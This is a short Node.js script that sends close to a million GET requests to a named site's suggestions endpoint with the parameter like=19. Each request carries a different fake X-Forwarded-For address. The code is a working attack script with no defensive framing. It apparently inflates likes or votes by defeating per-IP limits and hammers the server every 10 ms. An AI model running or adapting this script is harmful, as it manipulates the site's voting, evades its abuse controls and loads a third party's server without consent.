var request = require("request");

async function xd() {
    for (let i = 1; i < 100; i++) {
        for (let j = 1; j < 100; j++) {
            for (let k = 1; k < 100; k++) {
                let options = {
                    method: 'GET',
                    url: 'https://ceapa.cool/suggestions/',
                    qs: {like: '19'},
                    headers: {'x-forwarded-for': "100." + i + "." + j + "." + k},
                };
                console.log("sending from ip: " + options.headers['x-forwarded-for']);
                request(options, function (error, response, body) {
                    console.log("resault from ip: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
                });
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        }
    }
}

xd();